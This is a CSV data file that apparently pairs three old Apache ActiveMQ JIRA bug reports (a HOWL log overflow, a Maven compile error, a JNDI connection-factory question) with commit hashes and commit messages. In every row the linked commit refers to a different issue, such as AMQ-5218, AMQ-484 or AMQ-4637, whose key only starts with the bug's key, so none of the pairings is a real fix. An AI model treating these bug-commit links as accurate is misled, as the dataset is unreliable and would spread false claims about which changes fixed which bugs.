bug id,bug key,bug description,commit hash,commit msg
12481339,AMQ-52,HOWL log gets a log file overflow exception if you run tests twice without cleaning.  Most likely you are not setting the mark when a message delivery is committed to indicate that the message can be forgotten.,845e62af76a836eb41a3b6457fdbac161e6de6c9,https://issues.apache.org/jira/browse/AMQ-5218 - DestinationsPlugin
12481339,AMQ-52,HOWL log gets a log file overflow exception if you run tests twice without cleaning.  Most likely you are not setting the mark when a message delivery is committed to indicate that the message can be forgotten.,7ceb4d0c8e55364c21e798918eaf1fdb18b95138,"https://issues.apache.org/jira/browse/AMQ-5223

Added the bundle packaging option"
12481339,AMQ-52,HOWL log gets a log file overflow exception if you run tests twice without cleaning.  Most likely you are not setting the mark when a message delivery is committed to indicate that the message can be forgotten.,fe1d05082860cff8fd2585e6dc3c3e04477e29f8,"AMQ-5242 excluding text because of failures/hangs on AIX, Solaris, Windows"
12481339,AMQ-52,HOWL log gets a log file overflow exception if you run tests twice without cleaning.  Most likely you are not setting the mark when a message delivery is committed to indicate that the message can be forgotten.,eae21120284b6841b5cd3c4e340d5cbe853f1644,"Exclude some MQTT tests on HP-UX, see AMQ-5267"
12481339,AMQ-52,HOWL log gets a log file overflow exception if you run tests twice without cleaning.  Most likely you are not setting the mark when a message delivery is committed to indicate that the message can be forgotten.,2b53036b27591ad62db16516bd682e811ffae719,"Excluding some tests which hang Jenkins on Windows and Solaris, see AMQ-5270"
12481339,AMQ-52,HOWL log gets a log file overflow exception if you run tests twice without cleaning.  Most likely you are not setting the mark when a message delivery is committed to indicate that the message can be forgotten.,6ac3138daff50b8ba0620d31f5b36d83d0316540,"https://issues.apache.org/jira/browse/AMQ-5222

Add test to show this is working as it should."
12481339,AMQ-52,HOWL log gets a log file overflow exception if you run tests twice without cleaning.  Most likely you are not setting the mark when a message delivery is committed to indicate that the message can be forgotten.,428fc82c8cad36fe600a68cffeb3c4161a345a17,AMQ5266Test can take 8mins locally - exclude from quick tests
12481339,AMQ-52,HOWL log gets a log file overflow exception if you run tests twice without cleaning.  Most likely you are not setting the mark when a message delivery is committed to indicate that the message can be forgotten.,7c116631b504e31fb0bd9f805b1b77090d16f4ff,AMQ-5266 - fix leak in transaction context - completions were not cleared on close/commit
12481249,AMQ-48,"Seems like the jar files that are being downloaded by maven cause our stuff to fail to compile.

java:compile:
    [echo] Compiling to C:\sandbox\activemq/target/classes
    [javac] Compiling 345 source files to C:\sandbox\activemq\target\classes
C:\sandbox\activemq\src\java\org\codehaus\activemq\transport\gnet\GTransportChannel.java:162: cannot resolve symbol
symbol  : method flush ()
location: interface org.apache.geronimo.network.protocol.Protocol
                                getDownProtocol().flush();",eef92026754b0cc94c2b0ba21ece0b531b518b97,"AMQ-484: Restore discoveryUri when replacing TransportConnector with ManagedTransportConnector

git-svn-id: https://svn.apache.org/repos/asf/incubator/activemq/trunk@368911 13f79535-47bb-0310-9956-ffa450edef68"
12481249,AMQ-48,"Seems like the jar files that are being downloaded by maven cause our stuff to fail to compile.

java:compile:
    [echo] Compiling to C:\sandbox\activemq/target/classes
    [javac] Compiling 345 source files to C:\sandbox\activemq\target\classes
C:\sandbox\activemq\src\java\org\codehaus\activemq\transport\gnet\GTransportChannel.java:162: cannot resolve symbol
symbol  : method flush ()
location: interface org.apache.geronimo.network.protocol.Protocol
                                getDownProtocol().flush();",f7311567a022dcdfb00126b4931a485a8afdb134,Fixes https://issues.apache.org/jira/browse/AMQ-4840 - Invalid STOMP frame sent on websocket connections with heartbeats.
12481249,AMQ-48,"Seems like the jar files that are being downloaded by maven cause our stuff to fail to compile.

java:compile:
    [echo] Compiling to C:\sandbox\activemq/target/classes
    [javac] Compiling 345 source files to C:\sandbox\activemq\target\classes
C:\sandbox\activemq\src\java\org\codehaus\activemq\transport\gnet\GTransportChannel.java:162: cannot resolve symbol
symbol  : method flush ()
location: interface org.apache.geronimo.network.protocol.Protocol
                                getDownProtocol().flush();",8f078a3f4ce0599f958c1363e55fbc966013cdba,"https://issues.apache.org/jira/browse/AMQ-4853

Add hashCode and equals override so that this object can be used in
collections properly"
12481249,AMQ-48,"Seems like the jar files that are being downloaded by maven cause our stuff to fail to compile.

java:compile:
    [echo] Compiling to C:\sandbox\activemq/target/classes
    [javac] Compiling 345 source files to C:\sandbox\activemq\target\classes
C:\sandbox\activemq\src\java\org\codehaus\activemq\transport\gnet\GTransportChannel.java:162: cannot resolve symbol
symbol  : method flush ()
location: interface org.apache.geronimo.network.protocol.Protocol
                                getDownProtocol().flush();",6552287221c1706684fb2babe5d9777aabd09531,"https://issues.apache.org/jira/browse/AMQ-4853

adds a little test and preserves some performance tests if needed later."
12481249,AMQ-48,"Seems like the jar files that are being downloaded by maven cause our stuff to fail to compile.

java:compile:
    [echo] Compiling to C:\sandbox\activemq/target/classes
    [javac] Compiling 345 source files to C:\sandbox\activemq\target\classes
C:\sandbox\activemq\src\java\org\codehaus\activemq\transport\gnet\GTransportChannel.java:162: cannot resolve symbol
symbol  : method flush ()
location: interface org.apache.geronimo.network.protocol.Protocol
                                getDownProtocol().flush();",291ec5ea17817cb374c1a2342dd280ee986ebaa3,Fix for https://issues.apache.org/jira/browse/AMQ-4884
12481249,AMQ-48,"Seems like the jar files that are being downloaded by maven cause our stuff to fail to compile.

java:compile:
    [echo] Compiling to C:\sandbox\activemq/target/classes
    [javac] Compiling 345 source files to C:\sandbox\activemq\target\classes
C:\sandbox\activemq\src\java\org\codehaus\activemq\transport\gnet\GTransportChannel.java:162: cannot resolve symbol
symbol  : method flush ()
location: interface org.apache.geronimo.network.protocol.Protocol
                                getDownProtocol().flush();",a6e306437efafc13cf2c2e9d681d5685fdfbcfce,fix for: https://issues.apache.org/jira/browse/AMQ-4893
12481249,AMQ-48,"Seems like the jar files that are being downloaded by maven cause our stuff to fail to compile.

java:compile:
    [echo] Compiling to C:\sandbox\activemq/target/classes
    [javac] Compiling 345 source files to C:\sandbox\activemq\target\classes
C:\sandbox\activemq\src\java\org\codehaus\activemq\transport\gnet\GTransportChannel.java:162: cannot resolve symbol
symbol  : method flush ()
location: interface org.apache.geronimo.network.protocol.Protocol
                                getDownProtocol().flush();",8b06c44cc0028565b1de42bebad024f20fbc1a00,Added test to reproduce AMQ-4887
12481249,AMQ-48,"Seems like the jar files that are being downloaded by maven cause our stuff to fail to compile.

java:compile:
    [echo] Compiling to C:\sandbox\activemq/target/classes
    [javac] Compiling 345 source files to C:\sandbox\activemq\target\classes
C:\sandbox\activemq\src\java\org\codehaus\activemq\transport\gnet\GTransportChannel.java:162: cannot resolve symbol
symbol  : method flush ()
location: interface org.apache.geronimo.network.protocol.Protocol
                                getDownProtocol().flush();",5e42bd64bcf3c1557f2f108f57124e3e066ec158,"Added no-op version of testVirtualTopicFailover, which is covered by AMQ-4842"
12481334,AMQ-46,"I created the following FS JNDI context, but noticed that the FactoryName is an interface, which I thought might be causing the problem -

#This file is used by the JNDI FSContext.
#Thu Jul 29 10:42:05 EST 2004
JmsQueueConnectionFactory/RefAddr/3/Content=defaultUser
JmsQueueConnectionFactory/RefAddr/3/Type=userName
JmsQueueConnectionFactory/FactoryName=org.codehaus.activemq.jndi.JNDIStorableInterface
JmsQueueConnectionFactory/RefAddr/0/Type=brokerURL
JmsQueueConnectionFactory/RefAddr/0/Encoding=String
JmsQueueConnectionFactory/RefAddr/3/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Type=password
JmsQueueConnectionFactory/RefAddr/0/Content=tcp\://localhost\:61616
JmsQueueConnectionFactory/RefAddr/2/Content=false
JmsQueueConnectionFactory/RefAddr/2/Type=useEmbeddedBroker
JmsQueueConnectionFactory/ClassName=org.codehaus.activemq.ActiveMQConnectionFactory
JmsQueueConnectionFactory/RefAddr/2/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Content=defaultPassword

How are other people getting their connections from Jndi?",d06b32bab3ad3c98c7802ce3955ab8512d449cde,"PR: AMQ-461
Submitted by: Bill Dudney
m2 poms need patches

git-svn-id: https://svn.apache.org/repos/asf/incubator/activemq/trunk@365390 13f79535-47bb-0310-9956-ffa450edef68"
12481334,AMQ-46,"I created the following FS JNDI context, but noticed that the FactoryName is an interface, which I thought might be causing the problem -

#This file is used by the JNDI FSContext.
#Thu Jul 29 10:42:05 EST 2004
JmsQueueConnectionFactory/RefAddr/3/Content=defaultUser
JmsQueueConnectionFactory/RefAddr/3/Type=userName
JmsQueueConnectionFactory/FactoryName=org.codehaus.activemq.jndi.JNDIStorableInterface
JmsQueueConnectionFactory/RefAddr/0/Type=brokerURL
JmsQueueConnectionFactory/RefAddr/0/Encoding=String
JmsQueueConnectionFactory/RefAddr/3/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Type=password
JmsQueueConnectionFactory/RefAddr/0/Content=tcp\://localhost\:61616
JmsQueueConnectionFactory/RefAddr/2/Content=false
JmsQueueConnectionFactory/RefAddr/2/Type=useEmbeddedBroker
JmsQueueConnectionFactory/ClassName=org.codehaus.activemq.ActiveMQConnectionFactory
JmsQueueConnectionFactory/RefAddr/2/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Content=defaultPassword

How are other people getting their connections from Jndi?",935ce6596843f0b505a1f79dc30b9f9984853f24,"added test case for AMQ-464

git-svn-id: https://svn.apache.org/repos/asf/incubator/activemq/trunk@366119 13f79535-47bb-0310-9956-ffa450edef68"
12481334,AMQ-46,"I created the following FS JNDI context, but noticed that the FactoryName is an interface, which I thought might be causing the problem -

#This file is used by the JNDI FSContext.
#Thu Jul 29 10:42:05 EST 2004
JmsQueueConnectionFactory/RefAddr/3/Content=defaultUser
JmsQueueConnectionFactory/RefAddr/3/Type=userName
JmsQueueConnectionFactory/FactoryName=org.codehaus.activemq.jndi.JNDIStorableInterface
JmsQueueConnectionFactory/RefAddr/0/Type=brokerURL
JmsQueueConnectionFactory/RefAddr/0/Encoding=String
JmsQueueConnectionFactory/RefAddr/3/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Type=password
JmsQueueConnectionFactory/RefAddr/0/Content=tcp\://localhost\:61616
JmsQueueConnectionFactory/RefAddr/2/Content=false
JmsQueueConnectionFactory/RefAddr/2/Type=useEmbeddedBroker
JmsQueueConnectionFactory/ClassName=org.codehaus.activemq.ActiveMQConnectionFactory
JmsQueueConnectionFactory/RefAddr/2/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Content=defaultPassword

How are other people getting their connections from Jndi?",a971b648ea8f9fcaa376f93811a3abaee7c667e1,"https://issues.apache.org/jira/browse/AMQ-4637 - populate DLQ_DELIVERY_FAILURE_CAUSE_PROPERTY for messages that exceed a redelivery policy - makes it easier to identify in the dlq

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1504423 13f79535-47bb-0310-9956-ffa450edef68"
12481334,AMQ-46,"I created the following FS JNDI context, but noticed that the FactoryName is an interface, which I thought might be causing the problem -

#This file is used by the JNDI FSContext.
#Thu Jul 29 10:42:05 EST 2004
JmsQueueConnectionFactory/RefAddr/3/Content=defaultUser
JmsQueueConnectionFactory/RefAddr/3/Type=userName
JmsQueueConnectionFactory/FactoryName=org.codehaus.activemq.jndi.JNDIStorableInterface
JmsQueueConnectionFactory/RefAddr/0/Type=brokerURL
JmsQueueConnectionFactory/RefAddr/0/Encoding=String
JmsQueueConnectionFactory/RefAddr/3/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Type=password
JmsQueueConnectionFactory/RefAddr/0/Content=tcp\://localhost\:61616
JmsQueueConnectionFactory/RefAddr/2/Content=false
JmsQueueConnectionFactory/RefAddr/2/Type=useEmbeddedBroker
JmsQueueConnectionFactory/ClassName=org.codehaus.activemq.ActiveMQConnectionFactory
JmsQueueConnectionFactory/RefAddr/2/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Content=defaultPassword

How are other people getting their connections from Jndi?",3940f2dffd7f6c26710b016b0065b1a5621ea61f,"https://issues.apache.org/jira/browse/AMQ-4640


git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1506079 13f79535-47bb-0310-9956-ffa450edef68"
